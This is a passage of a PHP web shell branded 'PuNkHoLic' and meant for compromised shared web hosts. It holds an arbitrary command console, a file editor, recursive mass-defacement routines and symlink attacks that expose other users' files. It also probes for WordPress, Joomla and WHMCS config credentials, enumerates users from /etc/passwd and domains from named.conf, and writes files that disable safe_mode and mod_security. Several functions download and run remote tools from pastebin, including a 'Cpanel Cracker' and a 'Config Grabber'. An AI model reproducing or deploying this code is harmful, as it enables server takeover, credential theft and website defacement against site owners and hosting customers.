echo '<h1>String conversions</h1><div class=content>';
$stringTools = array(
'Base64 encode' => 'base64_encode',
'Base64 decode' => 'base64_decode',
'Url encode' => 'urlencode',
'Url decode' => 'urldecode',
'Full urlencode' => 'full_urlencode',
'md5 hash' => 'md5',
'sha1 hash' => 'sha1',
'crypt' => 'crypt',
'CRC32' => 'crc32',
'ASCII to HEX' => 'ascii2hex',
'HEX to ASCII' => 'hex2ascii',
'HEX to DEC' => 'hexdec',
'HEX to BIN' => 'hex2bin',
'DEC to HEX' => 'dechex',
'DEC to BIN' => 'decbin',
'BIN to HEX' => 'bin2hex',
'BIN to DEC' => 'bindec',
'String to lower case' => 'strtolower',
'String to upper case' => 'strtoupper',
'Htmlspecialchars' => 'htmlspecialchars',
'String length' => 'strlen',
);
if(empty($_POST['ajax'])&&!empty($_POST['p1']))
$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
foreach($stringTools as $k => $v)
echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".htmlspecialchars(@$_POST['p2'])."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
if(!empty($_POST['p1'])) {
if(function_exists($_POST['p1']))
echo htmlspecialchars($_POST['p1']($_POST['p2']));
}
echo"</pre></div>";
printFooter();
}
function actionFilesTools() {
if( isset($_POST['p1']) )
$_POST['p1'] = urldecode($_POST['p1']);
if(@$_POST['p2']=='download') {
if(is_file($_POST['p1']) && is_readable($_POST['p1'])) {
ob_start("ob_gzhandler", 4096);
header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
if (function_exists("mime_content_type")) {
$type = @mime_content_type($_POST['p1']);
header("Content-Type: ".$type);
}
$fp = @fopen($_POST['p1'], "r");
if($fp) {
while(!@feof($fp))
echo @fread($fp, 1024);
fclose($fp);
}
} elseif(is_dir($_POST['p1']) && is_readable($_POST['p1'])) {
}
exit;
}
if( @$_POST['p2'] == 'mkfile' ) {
if(!file_exists($_POST['p1'])) {
$fp = @fopen($_POST['p1'], 'w');
if($fp) {
$_POST['p2'] = "edit";
fclose($fp);
}
}
}
printHeader();
echo '<h1>File tools</h1><div class=content>';
if( !file_exists(@$_POST['p1']) ) {
echo 'File not exists';
printFooter();
return;
}
$uid = @posix_getpwuid(@fileowner($_POST['p1']));
$gid = @posix_getgrgid(@fileowner($_POST['p1']));
echo '<span>Name:</span> '.htmlspecialchars($_POST['p1']).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
if( empty($_POST['p2']) )
$_POST['p2'] = 'view';
if( is_file($_POST['p1']) )
$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
else
$m = array('Chmod', 'Rename', 'Touch');
foreach($m as $v)
echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
echo '<br><br>';
switch($_POST['p2']) {
case 'view':
echo '<pre class=ml1>';
$fp = @fopen($_POST['p1'], 'r');
if($fp) {
while( !@feof($fp) )
echo htmlspecialchars(@fread($fp, 1024));
@fclose($fp);
}
echo '</pre>';
break;
case 'highlight':
if( is_readable($_POST['p1']) ) {
echo '<div class=ml1 style="background-color: black;color:black;">';
$code = highlight_file($_POST['p1'],true);
echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
}
break;
case 'chmod':
if( !empty($_POST['p3']) ) {
$perms = 0;
for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
if(!@chmod($_POST['p1'], $perms))
echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
else
die('<script>g(null,null,null,null,"")</script>');
}
echo '<form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
break;
case 'edit':
if( !is_writable($_POST['p1'])) {
echo 'File isn\'t writeable';
break;
}
if( !empty($_POST['p3']) ) {
@file_put_contents($_POST['p1'],$_POST['p3']);
echo 'Saved!<br><script>document.mf.p3.value="";</script>';
}
echo '<form onsubmit="g(null,null,null,null,this.text.value);return false;"><textarea name=text class=bigarea>';
$fp = @fopen($_POST['p1'], 'r');
if($fp) {
while( !@feof($fp) )
echo htmlspecialchars(@fread($fp, 1024));
@fclose($fp);
}
echo '</textarea><input type=submit value=">>"></form>';
break;
case 'hexdump':
$c = @file_get_contents($_POST['p1']);
$n = 0;
$h = array('00000000<br>','','');
$len = strlen($c);
for ($i=0; $i<$len; ++$i) {
$h[1] .= sprintf('%02X',ord($c[$i])).' ';
switch ( ord($c[$i]) ) {
case 0:$h[2] .= ' '; break;
case 9:$h[2] .= ' '; break;
case 10: $h[2] .= ' '; break;
case 13: $h[2] .= ' '; break;
default: $h[2] .= $c[$i]; break;
}
$n++;
if ($n == 32) {
$n = 0;
if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
$h[1] .= '<br>';
$h[2] .= "\n";
}
 }
echo '<table cellspacing=1 cellpadding=5 bgcolor=#red><tr><td bgcolor=red><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#red><pre>'.$h[1].'</pre></td><td bgcolor=#red><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
break;
case 'rename':
if( !empty($_POST['p3']) ) {
if(!@rename($_POST['p1'], $_POST['p3']))
echo 'Can\'t rename!<br><script>document.mf.p3.value="";</script>';
else
die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
}
echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
break;
case 'touch':
if( !empty($_POST['p3']) ) {
$time = strtotime($_POST['p3']);
if($time) {
if(@touch($_POST['p1'],$time,$time))
die('<script>g(null,null,null,null,"")</script>');
else {
echo 'Fail!<script>document.mf.p3.value="";</script>';
}
} else echo 'Bad time format!<script>document.mf.p3.value="";</script>';
}
echo '<form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
break;
case 'mkfile':
break;
}
echo '</div>';
printFooter();
}
function actionDefacer() {
printHeader();
echo "<h1>Recursive Mass Defacer</h1><div class=content>";
?>
<form ENCTYPE="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>" method=POST onSubmit="g(null,null,this.path.value,this.file.value,this.Contents.value);return false;">
<p align="Left">Folder: <input type=text name=path size=60 value="<?=getcwd(); ?>">
<br>file name : <input type=text name=file size=20 value="index.htm">
<br>Text Content : <input type=text name=Contents size=20 value="Hacked by PuNkHoLic "> 
<br><input type=submit value="Update"></p></form>
<?php
if ($_POST['a'] == 'Defacer') {
$mainpath = $_POST[p1];
$file = $_POST[p2];
$txtContents = $_POST[p3];
echo "-----------------------------------------------<br>
[+] Recursive Mass defacer<br>
-----------------------------------------------<br><br> ";
$dir = opendir($mainpath);
while ($row = readdir($dir)) {
$start = @fopen("$row/$file", "w+");
$code = $txtContents;
$finish = @fwrite($start, $code);
if ($finish) {
echo "http://$row/$file<br>";
}
if (strncasecmp(PHP_OS, 'WIN', 3) == 0) {
exec("for /r %cd% %i in (.) do @copy $file %i 1>NUL");
} else {
system("find $PWM -type d -exec cp $file {} \;");
}
}
echo "-----------------------------------------------<br><br>[+] Script by PuNkHoLic          [+]";
}
echo '</div>';
printFooter();
}
function actionConsole() {
if(isset($_POST['ajax'])) {
$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
ob_start();
echo "document.cf.cmd.value='';\n";
$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match)){
if(@chdir($match[1])) {
$GLOBALS['cwd'] = @getcwd();
echo "document.mf.c.value='".$GLOBALS['cwd']."';";
}
}
echo "document.cf.output.value+='".$temp."';";
echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
$temp = ob_get_clean();
echo strlen($temp), "\n", $temp;
exit;
}
printHeader();
echo '<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array("");
var cur = 0;
function kp(e) {
var n = (window.Event) ? e.which : e.keyCode;
if(n == 38) {
cur--;
if(cur>=0)
document.cf.cmd.value = cmds[cur];
else
cur++;
} else if(n == 40) {
cur++;
if(cur < cmds.length)
document.cf.cmd.value = cmds[cur];
else
cur--;
}
}
function add(cmd) {
cmds.pop();
cmds.push(cmd);
cmds.push("");
cur = cmds.length-1;
}
</script>';
echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
foreach($GLOBALS['aliases'] as $n => $v) {
if($v == '') {
echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
continue;
}
echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
}
if(empty($_POST['ajax'])&&!empty($_POST['p1']))
$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;" readonly>';
if(!empty($_POST['p1'])) {
echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
}
echo '</textarea><input type=text name=cmd style="border-top:1;width:100%;" onkeydown="kp(event);">';
echo '</form></div><script>document.cf.cmd.focus();</script>';
printFooter();
}
function actionLogout() {
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
echo '<title>Get out Now</title><body bgcolor=#000000><center><img src="http://i.imgur.com/t54UCIw.jpgl"><br>
<style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress !important;}</style><a href="http://www.cursors-4u.com/cursor/2012/02/11/chrome-pointer.html" target="_blank" title="Chrome Pointer"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Chrome Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
<span style="color:red;font: 20pt audiowide;">You are out now :D<br>www.facebook.com/PuNkHoLic</h2></span></center></body>';
}
///my editing start here for tools
function download_remote_file($file_url, $save_to)
{
$content = file_get_contents($file_url);
file_put_contents($save_to, $content);
}
if (isset($_POST['cp'])) {
download_remote_file('http://pastebin.com/raw/2Ntdj7ju', realpath("./") . '/cp.php');
header("location:cp.php");
} 
if (isset($_POST['SymlinkbySmevk'])) {
download_remote_file('http://pastebin.com/raw.php?i=PhSk7Kvq', realpath("./") . '/SymlinkbySmevk.php');
header("location:SymlinkbySmevk.php");
}
if (isset($_POST['SymlinkbyCheetah'])) {
download_remote_file('http://pastebin.com/raw.php?i=EXejgAMv', realpath("./") . '/SymlinkbyCheetah.php');
header("location:SymlinkbyCheetah.php");
}
if (isset($_POST['SymlinkbyTorjan'])) {
download_remote_file('http://pastebin.com/raw.php?i=YUg4pXe2', realpath("./") . '/sym.py');
$url = 'http://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['SCRIPT_NAME']) . '/trjnx/';
header('location: '.$url);
system('python sym.py');
}
if (isset($_POST['jump'])) {
download_remote_file('http://pastebin.com/raw/MxtcT6nX', realpath("./") . '/jump.php');
header("location:jump.php");
}
if (isset($_POST['adminer'])) {
system('wget https://www.adminer.org/static/download/4.2.5/adminer-4.2.5-mysql-en.php adminer.php');
header("location:adminer-4.2.5-mysql-en.php");
}
if (isset($_POST['cg'])) {
download_remote_file('http://pastebin.com/raw/WSgkDHSN', realpath("./") . '/cg.php');
header("location:cg.php");
}
function actionImportScripts() {
printHeader();
echo '<table border="1px" align="center" id ="PuNkHoLictools" cellpadding="10" border-color"green"><tr><td>Just click and get the Script :).</td><tr><td>
<form action ="" method="post">
<input type = "submit" name="cp" value ="Cpanel Cracker"></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="SymlinkbyTorjan"value ="Symlink Python Script By Torjan"></a></td></tr>';
echo '<td><form action ="" method="post"><input type = "submit" name="SymlinkbySmevk" value ="Symlink Script By SmEvK_PaThAn"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="SymlinkbyCheetah" value ="Symlink By Kashmiri Cheetah"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="jump" value ="Jumping Shell"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="adminer"value ="Adminer"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="cg"value ="Config Grabber"></a></td></tr>';
printFooter();
}
function actionShared() {
printHeader();
$file = @implode(@file("/etc/named.conf"));
if (!$file) {
die("# can't ReaD -> [ /etc/named.conf ]");
}
preg_match_all("#named/(.*?).db#", $file, $r);
$domains = array_unique($r[1]);
{
foreach ($domains as $domain) {
$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
$array= "http://$domain " . $user['name'] . "<br>";
$lol= '' . get_current_user();
if (strpos($array, "$lol") !== false) {
$shared = str_replace(array(" $lol"), "", $array);
echo "<center>$shared";
}
}
}
printFooter();
}
function actionSymlink() {
printHeader();
echo '<h1>Symlink</h1>';
$furl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$expld = explode('/',$furl );
$burl =str_replace(end($expld),'',$furl);
echo '<div class="content"><center>
<h3>[ <a href="#" onclick="g(\'symlink\',null,\'website\',null)">Domains</a> ] - 
[ <a href="#" onclick="g(\'symlink\',null,\'whole\',null)">Whole Server Symlink<sup style="color:red;text-decoration:blink;"></sup></a> ] - 
[ <a href="#" onclick="g(\'symlink\',null,\'config\',null)">Config files symlink</a> ]</h3></center>';
if(isset($_POST['p1']) && $_POST['p1']=='website')
{
echo "<center>";
$d0mains = @file("/etc/named.conf");
if(!$d0mains){ 
echo "<pre class=ml1 style='margin-top:5px'>Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
} else {
echo "<table align=center class='main' border=0 ><tr><th> Domains </th></tr>";
$unk = array();
foreach($d0mains as $d0main){
if(@eregi("zone",$d0main)){
preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$unk[] = $domains[1][0];
flush();
}
}
}
$count=1;
$unk = array_unique($unk);
$l=0;
foreach($unk as $d){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$d));
echo "<tr".($l?' class=l1':'')."><td><a href=http://".$d."/>".$d."</a></td><td>".$user['name']."</td></tr>";
flush();
$count++;
$l=$l?0:1;
}
echo "</table>";
}
echo "</center>"; 
}
if(isset($_POST['p1']) && $_POST['p1']=='whole')
{
echo "<center>";
@mkdir('PCAPuNkHoLic_sym',0777);
$hdt= "Options all\nDirectoryIndex Sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
$hfp =@fopen ('PCAPuNkHoLic_sym/.htaccess','w');
fwrite($hfp ,$hdt);
if(function_exists('symlink')) {
@symlink('/','PCAPuNkHoLic_sym/root');
}
$d0mains = @file('/etc/named.conf');
if(!$d0mains) {
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
echo "<table align='center' width='40%' class='main'><tr><th> Count </th><th> Domains </th><th> User </th><th> Symlink </th></tr>";
$dt = file('/etc/passwd');
$l=0;
foreach($dt as $d) {
$r = explode(':',$d);
if(strpos($r[5],'home')) {
echo "<tr".($l?' class=l1':'')."><td>".$j."</td><td>---</td><td>".$r[0]."</td><td><a href='PCAPuNkHoLic_sym/root".$r[5]."/public_html' target='_blank'>symlink</a></td></tr>";
$l=$l?0:1;
$j++;
}
}
echo '</table>';
} else {
echo "<table align='center' width='40%' class='main'><tr><th> Count </th><th> Domains </th><th> User </th><th> Symlink </th></tr>";
$count=1;
$mck = array();
foreach($d0mains as $d0main){
if(@eregi('zone',$d0main)){
preg_match_all('#zone "(.*)"#',$d0main,$domain);
flush();
if(strlen(trim($domain[1][0])) >2){
$mck[] = $domain[1][0];
}
}
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
$infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
$usr[] = $infos['name'];
$dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
$r = explode(':',$d);
if(strpos($r[5],'home')) {
$passwd[$r[0]] = $r[5];
}
}
$l=0;
$j=1;
foreach($usr as $r) {
echo "<tr".($l?' class=l1':'')."><td>".$count++."</td>
<td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td>
<td>'.$r."</td>
<td><a href='PCAPuNkHoLic_sym/root".$passwd[$r]."/public_html' target='_blank'>symlink</a></td></tr>";
flush();
$l=$l?0:1;
$j++;
}
echo '</table>';
}
echo "</center>";
}
if(isset($_POST['p1']) && $_POST['p1']=='config')
{
echo "<center>";
@mkdir('PCAPuNkHoLic_sym',0777);
$hdt = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \nAddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$hfp = @fopen ('PCAPuNkHoLic_sym/.htaccess','w');
@fwrite($hfp ,$hdt);
if(function_exists('symlink')) {
@symlink('/','PCAPuNkHoLic_sym/root');
}
$d0mains=@file('/etc/named.conf');
if(!$d0mains) {
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
}else {
echo "<table align='center' width='40%' class='main' ><tr><th> Count </th><th> Domain </th<th> User </th>><th> Script </th></tr>";
$count = 1;
$l=0;
foreach($d0mains as $d0main){
if(@eregi('zone',$d0main)){
preg_match_all('#zone "(.*)"#',$d0main,$domain);
flush();
if(strlen(trim($domain[1][0]))>2){
$user = posix_getpwuid(@fileowner('/etc/valiases/'.$domain[1][0]));
$c1 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/wp-config.php';
$ch01 = get_headers($c1);
$cf01 = $ch01[0];
$c2 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/blog/wp-config.php';
$ch02 = get_headers($c2);
$cf02 = $ch02[0];
$c3 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/configuration.php';
$ch03 = get_headers($c3);
$cf03 = $ch03[0];
$c4 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/joomla/configuration.php';
$ch04 = get_headers($c4);
$cf04 = $ch04[0];
$c5 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/includes/config.php';
$ch05 = get_headers($c5);
$cf05 = $ch05[0];
$c6 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/vb/includes/config.php';
$ch06 = get_headers($c6);
$cf06 = $ch06[0];
$c7 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/forum/includes/config.php';
$ch07 = get_headers($c7);
$cf07 = $ch07[0];
$c8 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'public_html/clients/configuration.php';
$ch08 = get_headers($c8);
$cf08 = $ch08[0];
$c9 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/support/configuration.php';
$ch09 = get_headers($c9);
$cf09 = $ch09[0];
$c10 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/client/configuration.php';
$ch10 = get_headers($c10);
$cf10 = $ch10[0];
$c11 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/submitticket.php';
$ch11 = get_headers($c11);
$cf11 = $ch11[0];
$c12 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/client/configuration.php';
$ch12 = get_headers($c12);
$cf12 = $ch12[0];
$c13 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/includes/configure.php';
$ch13 = get_headers($c13);
$cf13 = $ch13[0];
$c14 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/include/app_config.php';
$ch14 = get_headers($c14);
$cf14 = $ch14[0];
$c15 = $burl.'/PCAPuNkHoLic_sym/root/home/'.$user['name'].'/public_html/sites/default/settings.php';
$ch15 = get_headers($c15);
$cf15 = $ch15[0];
$out = '&nbsp;';
if(strpos($cf01,'200') == true){ $out = "<a href='".$c1."' target='_blank'>Wordpress</a>"; } 
elseif(strpos($cf02,'200') == true){ $out = "<a href='".$c2."' target='_blank'>Wordpress</a>"; }
elseif(strpos($cf03,'200') == true && strpos($cf11,'200') == true) { $out = " <a href='".$c11."' target='_blank'>WHMCS</a>"; }
elseif(strpos($cf09,'200') == true){ $out = " <a href='".$c9."' target='_blank'>WHMCS</a>";}
elseif(strpos($cf10,'200') == true){ $out = " <a href='".$c10."' target='_blank'>WHMCS</a>"; }
elseif(strpos($cf03,'200') == true){ $out = " <a href='".$c3."' target='_blank'>Joomla</a>"; }
elseif(strpos($cf04,'200') == true){ $out = " <a href='".$c4."' target='_blank'>Joomla</a>"; }
elseif(strpos($cf05,'200') == true){ $out = " <a href='".$c5."' target='_blank'>vBulletin</a>";}
elseif(strpos($cf06,'200') == true){ $out = " <a href='".$c6."' target='_blank'>vBulletin</a>";}
elseif(strpos($cf07,'200') == true){ $out = " <a href='".$c7."' target='_blank'>vBulletin</a>";}
elseif(strpos($cf08,'200') == true){ $out = " <a href='".$c7."' target='_blank'>Client Area</a>";}
elseif(strpos($cf12,'200') == true){ $out = " <a href='".$c7."' target='_blank'>Client Area</a>";}
elseif(strpos($cf13,'200') == true){ $out = " <a href='".$c7."' target='_blank'>osCommerce/Zen Cart</a>";}
elseif(strpos($cf14,'200') == true){ $out = " <a href='".$c7."' target='_blank'>Magento</a>";}
elseif(strpos($cf15,'200') == true){ $out = " <a href='".$c7."' target='_blank'>Drupal</a>";}
else {
continue;
}
echo '<tr'.($l?' class=l1':'').'><td>'.$count++.'</td><td><a href=http://www.'.$domain[1][0].'/>'.$domain[1][0].'</a></td><td>'.$user['name'].'</td><td>'.$out.'</td></tr>';
flush();
$l=$l?0:1;
}
}
}
echo "</table>";
}
echo "</center>"; 
}
echo "</div>";
printFooter();
} 
 function actionJumping() 
{printHeader();
echo '<html><head><title>'.getenv("HTTP_HOST").' - Jumping Server</title></head><body>';
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<font size="4" color="#000000" face="Calibri"><b>Error: Safe_mode = On</b></font>');
set_time_limit(0);@$passwd = fopen('/etc/passwd','r');if (!$passwd) { die('<font size="4" color="#000000" face="Calibri"><b>[-] Error : Coudn`t Read /etc/passwd</b></font>'); }
$pub = array();$users = array();$conf = array();$i = 0;while(!feof($passwd)){$str = fgets($passwd);if ($i > 100){ $pos = strpos($str,':');$username = substr($str,0,$pos);$dirz = '/home/'.$username.'/public_html/';if (($username != '')) { if (is_readable($dirz)) { array_push($users,$username);array_push($pub,$dirz); }}}$i++;}
echo '<font color=aqua> [-]==================[ START ]==================[-]<br></font>';
foreach ($users as $user){echo "<font color=#a3e956> [+] /home/$user/public_html/</font><br/>";} echo "\n <font color=aqua><br>[-]==================[ FINISH ]==================[-] <br></font>\n"; echo '</body></html>';
printFooter();
}
function actionSubdomain() {
printHeader();
error_reporting(0);
$user = get_current_user();
$open = opendir('/home/' . $user . '/access-logs/');
while ($dir = readdir($open)) {
$totalDoamin[] = $dir;
}
closedir($open);
$total = count($totalDoamin);
$domain = $total - 2;
if ($domain > 0) {
echo "<h2><b><font style=\"color: #a3e956 ;\" > ~ Total </font><font style=\"color: #a3e956; \">" . $domain . "</font><font style=\"color: #a3e956;\" > Sub Domain Found! ~ </font><br><BR>";
} else {
echo "<h2><b> ~ <font color='red' style=\"color: red; text-shadow: red 0px 0px 4px ; \">0</font><font style=\"color: #black; text-shadow: black 0px 0px 6px ;\"> Sub Domain Found! ~</font><br><BR>";
}
$scan = array_diff(scandir('/home/' . $user . '/access-logs/'), array('.'));
$domains = implode("
http://", $scan);
echo '
<style>
body {
text-align: center;
}
</style><textarea style="color: #a3e956; background-color: black" rows=\'30\' cols=\'100\'>';
print_r($domains);
echo '</textarea>';
printFooter();
}
function actionSym() {
printHeader();
$file = @implode(@file("/etc/named.conf"));
if (!$file) {
die("# can't ReaD -> [ /etc/named.conf ]");
}
preg_match_all("#named/(.*?).db#", $file, $r);
$domains = array_unique($r[1]);
{
foreach ($domains as $domain) {
$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
$array= "<br>http://$domain<br>";
$lol= '' . get_current_user();
if (strpos($array, "$lol") == false) {
$shared = str_replace(array(" $lol"), "", $array);
echo "<center>$shared";
}
}
}
printFooter();
}
function actionBypass() {
printHeader();
echo '<h1>Safe Mode</h1>';
echo '<div class="content">';
echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh] files create in following dir<br>| ".$GLOBALS['cwd']." |<br><br />";
echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
if(!empty($_POST['p2']) && isset($_POST['p2']))
{
$fil=fopen($GLOBALS['cwd'].".htaccess","w");
fwrite($fil,'<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>');
fclose($fil);
 }
 if(!empty($_POST['p1'])&& isset($_POST['p1']))
 {
$fil=fopen($GLOBALS['cwd']."php.ini","w");
fwrite($fil,'safe_mode=OFF
disable_functions=NONE');
fclose($fil);
}
if(!empty($_POST['p3']) && isset($_POST['p3']))
{
$fil=fopen($GLOBALS['cwd'].".htaccess","w");
fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .sh
AddHandler cgi-script .pl
AddHandler cgi-script .pl');
fclose($fil); 
}
echo "<br><br /><br /></div>";
echo '</div>';
printFooter();
}
function actionDeface() {
printHeader();
echo "<h1>Mass Defacer by PuNkHoLic</h1><div class=content>";
?>
<form ENCTYPE="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>" method=POST onSubmit="g(null,null,this.path.value,this.file.value,this.Contents.value);return false;">
<p align="Left">Folder: <input type=text name=path size=60 value="<?=getcwd(); ?>">
<br>file name : <input type=text name=file size=20 value="index.php">
<br>Text Content : <input type=text name=Contents size=70 value="Add your deface txt here"> 
<br><input type=submit value="Deface now"></p></form>
<?php
if ($_POST['a'] == 'Deface') {
$mainpath = $_POST[p1];
$file = $_POST[p2];
$txtContents = $_POST[p3];
echo "PuNkHoLic";
$dir = opendir($mainpath); //fixme - cannot deface when change to writeable path!!
while ($row = readdir($dir)) {
$start = @fopen("$row/$file", "w+");
$code = $txtContents;
$finish = @fwrite($start, $code);
if ($finish) {
echo "$row/$file > Done<br><br>";
}
}
}
echo '</div>';
printFooter();
}
 function actionDomain() {
printHeader();
echo '<h1>Local Domains</h1><div class=content>';
$file = @implode(@file("/etc/named.conf"));
$Domain_path = "/var/named";
if (!$file) {
$domains = scandir($Domain_path);
$count=1;
$dc = 0;
echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>There are : ( <b>" . count($domains) . "</b> ) Domains in this Sever.Can't read named.cof .Domains are bypassed actually,you will face problem in symlink. </td></tr>
<tr><td>No</td><td>Domain</td><td>User</td></tr>";
foreach ($domains as &$domain) {
if (stripos($domain,".db")) {
$domain = str_replace('.db','',$domain);
}
if (strlen($domain) > 6) {
echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>User</td></tr>";
}
} 
echo "</table>";
}else{
$count = 1;
preg_match_all("#named/(.*?).db#", $file, $r);
$domains = array_unique($r[1]);
echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2> There are( <b>" . count($domains) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
<tr><td>No</td><td>Domain</td><td>User</td></tr>";
foreach ($domains as $domain) {
$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
